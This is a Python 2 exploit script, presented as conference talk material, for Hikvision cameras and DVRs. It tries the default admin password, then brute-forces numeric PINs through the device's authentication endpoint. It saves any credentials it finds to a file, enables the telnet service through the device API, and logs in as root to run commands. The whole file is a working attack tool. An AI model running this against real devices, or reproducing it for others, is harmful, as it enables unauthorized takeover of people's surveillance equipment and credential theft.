#!/usr/bin/python
# BSidesMCR Presentation Material
# Exploit for Hikvision pin bruteforce
# Dominic Chell <dominic [at] mdsec.co.uk>
# Updated By Random_Robbie @random_robbie

from gevent import monkey
monkey.patch_all()

import sys, time, urllib2, base64, telnetlib

from random import randint
import gevent.pool

global password
global host

def do_brute(path):
    global password
    global host

    for i in xrange(0000, 99999):
	header = base64.b64encode("admin:" + str(i))
        url = urllib2.Request("http://"+host+""+path+"/userCheck")
	url.add_header('Authorization', "Basic " + header)
        response = urllib2.urlopen(url)
	print "[*] Testing: %s" %(i)
	if "<statusString>OK</statusString>" in response.read():
		password = str(i)
		print "[*] Found Password: %s:\n %s" %(i, response.read())
		enable_telnetd(header,path)
		return
		
def do_default(host,path):

	header = base64.b64encode("admin:12345")
        url = urllib2.Request("http://"+host+""+path+"/userCheck")
	url.add_header('Authorization', "Basic " + header)
        response = urllib2.urlopen(url)
	print "[*] Testing: 12345"
	if "<statusString>OK</statusString>" in response.read():
		password = "12345"
		print "[*] Found Password: 12345"
		enable_telnetd(header,path)
		return
	
		
def detect_system(host):
	
	try:
		url = urllib2.Request("http://"+host+"/PSIA/Custom/SelfExt")
		response = urllib2.urlopen(url)
	except urllib2.HTTPError as e:
		if e.code == 401:
			path = "/PSIA/Custom/SelfExt"
			print ("[*] Newer Model")
			return path
		else:
			path = "/ISAPI/Security"
			print "[*] Older Model"
			return path

def enable_telnetd(header,path):
	global host
	try:
		text_file = open("found.txt", "a")
		login_details = base64.b64decode(header)
		text_file.write("Host: "+host+" Combo:"+login_details+"- \n")
		text_file.close()
		print "[*] Enabling telnetd"
		baseURL = "http://"+host+""+path+"Network/telnetd"
		data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Telnetd><enabled>true</enabled></Telnetd>"
		request = urllib2.Request(baseURL, data)
		request.add_header('Authorization', "Basic " + header)
		request.get_method = lambda: 'PUT' #if I remove this line then the POST works fine.
		response = urllib2.urlopen(request)
	except urllib2.HTTPError as e:
		if e.code == 404:
			print "[*] This Model Does Not Support Telnet Sorry"
			exit();
		else:
			time.sleep(3)
			login_telnetd()


def login_telnetd():
	global password
	global host
	print "[*] Logging in to device"
	tn = telnetlib.Telnet(host)
	tn.read_until("dvrdvs login:")
	print "[*] Sending username 'root'"
	tn.write("root\n")
	tn.read_until("Password: ")
	print "[*] Sending password '"+password+"'"
    	tn.write(password + "\n")
	print "[*] Sending commands"
	tn.write("id;exit\n")
	print tn.read_all()

	

if __name__ == '__main__':
	global host
	global password
	if len(sys.argv)<2:
		print "[*] Please supply IP of target"
		sys.exit()

	password = ""
	host = sys.argv[1]
	path = detect_system(host)
	do_default(host,path)
	do_brute(path)
